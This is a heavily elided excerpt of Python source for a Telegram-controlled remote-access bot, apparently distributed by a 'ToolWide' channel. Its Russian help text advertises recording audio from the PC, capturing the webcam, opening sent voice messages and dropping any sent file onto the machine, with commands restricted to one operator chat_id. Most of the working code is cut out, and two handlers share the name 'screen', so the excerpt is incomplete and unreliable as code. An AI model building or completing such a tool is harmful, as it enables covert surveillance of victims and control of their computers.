################################################################################
#                              ToolWide                                        #
#                     Telegram https://t.me/Toolwide_official                  #
...
while True:
    try:
            ...
            if message.chat.id == int(chat_id):
                try:
                    bot.send_message(chat_id, """
                        ...
                        \n/au длительность в цифрах 1000 примерно 23 секунды - Запись аудио с вашего пк
                        ...
                        \nТак же, если ты скинешь мне голосовое сообщение я открою его на пк
                        \nЕщё ты можешь скинуть мне любой файл и я его сохраню на пк""")
        ...
        def screen(message, res=False):
            if message.chat.id == int(chat_id):
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета')
        ...
        def screen(message, res=False):
            if message.chat.id == int(chat_id):
                try:
                    ...
                    bot.send_message(chat_id, 'У вас нету веб камеры.')
            else:
                bot.send_message(message.chat.id, 'У вас нет доступа к боту!')
